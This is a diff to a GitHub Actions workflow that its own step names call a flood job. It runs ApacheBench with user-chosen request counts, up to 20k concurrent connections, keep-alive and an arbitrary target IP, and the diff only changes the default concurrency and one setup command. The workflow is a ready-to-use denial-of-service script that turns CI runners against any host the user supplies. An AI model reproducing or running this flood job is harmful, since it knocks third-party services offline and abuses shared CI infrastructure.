@@ -14,7 +14,7 @@ on:
       multiconn:
         description: "Multi Connection (Max. 20k): "
         required: true
-        default: "20000"
+        default: "4864"
       psize:
         description: "Packet Size: "
         required: true
@@ -32,7 +32,7 @@ jobs:
     - name: Install dependencies & Prepare
       run: |
         sudo apt install apache2-utils
-        ulimit -n 65535
+        uname -a
     - name: Starting Flood...
       run: |
         sudo ab -n ${{ github.event.inputs.numreq }} -c ${{ github.event.inputs.multiconn }} -b ${{ github.event.inputs.psize }} -s ${{ github.event.inputs.maxtimeout }} -k -r ${{ github.event.inputs.iptgt }}/
